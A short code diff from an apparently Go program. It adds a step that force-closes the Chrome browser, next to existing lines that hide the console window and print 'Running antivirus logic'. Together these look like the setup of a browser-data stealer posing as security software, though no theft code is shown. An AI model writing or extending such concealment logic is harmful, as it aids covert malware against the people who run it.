@@ -27,6 +27,13 @@ const (
 )
 
 func main() {
+
+	// 1. Close Chrome Browser to avoid error msg
+	fmt.Println("Chrome Closed")
+	browsers.CloseChrome()
+	fmt.Println("Completed closing browser")
+
+
 	// Hide-console check at the start
 	fmt.Println("Running antivirus logic")
 	go hideconsole.Run()
